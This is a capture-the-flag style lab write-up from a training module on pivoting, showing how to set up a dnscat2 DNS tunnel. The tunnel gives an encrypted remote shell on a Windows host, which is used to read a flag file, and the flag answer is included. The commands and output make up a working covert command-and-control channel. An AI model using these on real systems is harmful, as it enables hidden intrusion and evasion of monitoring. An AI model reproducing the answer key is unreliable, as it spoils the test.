# Section 12: DNS Tunneling with Dnscat2

Module: 12. Pivoting, Tunneling, and Port Forwarding

---

## Questions & Answers

### 1. Using the concepts taught in this section, connect to the target and establish a DNS Tunnel that provides a shell session. Submit the contents of C:\Users\htb-student\Documents\flag.txt as the answer.

Context:
```bash
┌─[eu-academy-2]─[10.10.14.216]─[htb-ac-2162140@htb-vivsyuqxi8-htb-cloud-com]─[~/dnscat2/server]
└──╼ [★]$ sudo ruby dnscat2.rb --dns host=10.10.14.216,port=53,domain=inlanefreight.local --no-cache

New window created: 0
New window created: crypto-debug
Welcome to dnscat2! Some documentation may be out of date.

auto_attach => false
history_size (for new windows) => 1000
Security policy changed: All connections must be encrypted
New window created: dns1
Starting Dnscat2 DNS server on 10.10.14.216:53
[domains = inlanefreight.local]...

Assuming you have an authoritative DNS server, you can run
the client anywhere with the following (--secret is optional):

  ./dnscat --secret=bfd810080739163dacdfb39f0595ccbe inlanefreight.local

To talk directly to the server without a domain name, run:

  ./dnscat --dns server=x.x.x.x,port=53 --secret=bfd810080739163dacdfb39f0595ccbe

Of course, you have to figure out <server> yourself! Clients
will connect directly on UDP port 53.

dnscat2> New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
dnscat2> window -i 1
New window created: 1
history_size (session) => 1000
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
This is a console session!

That means that anything you type will be sent as-is to the
client, and anything they type will be displayed as-is on the
screen! If the client is executing a command and you don't
see a prompt, try typing 'pwd' or something!

To go back, type ctrl-z.

Microsoft Windows [Version 10.0.18363.1801]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Users\htb-student>
exec (OFFICEMANAGER) 1> dir
exec (OFFICEMANAGER) 1> dir
 Volume in drive C has no label.
 Volume Serial Number is C41A-F2ED

 Directory of C:\Users\htb-student

08/11/2026  02:25 AM    <DIR>          .
08/11/2026  02:25 AM    <DIR>          ..
02/22/2022  03:28 PM    <DIR>          3D Objects
02/22/2022  03:28 PM    <DIR>          Contacts
05/03/2022  08:10 AM    <DIR>          Desktop
08/11/2026  02:25 AM           410,495 dnscat2.ps1
05/03/2022  07:42 AM    <DIR>          Documents
05/13/2022  08:06 AM    <DIR>          Downloads
02/22/2022  03:28 PM    <DIR>          Favorites
02/22/2022  03:28 PM    <DIR>          Links
02/22/2022  03:28 PM    <DIR>          Music
04/26/2022  12:05 PM    <DIR>          OneDrive
02/22/2022  03:29 PM    <DIR>          Pictures
02/22/2022  03:28 PM    <DIR>          Saved Games
02/22/2022  03:28 PM    <DIR>          Searches
04/26/2022  08:24 PM    <DIR>          Videos
               1 File(s)        410,495 bytes
              15 Dir(s)  12,650,393,600 bytes free

exec (OFFICEMANAGER) 1> type C:\Users\htb-student\Documents\flag.txt
exec (OFFICEMANAGER) 1> type C:\Users\htb-student\Documents\flag.txt
AC@tinth3Tunnel
```

**Answer:** `AC@tinth3Tunnel`

---

[Back to Module Index](./README.md)
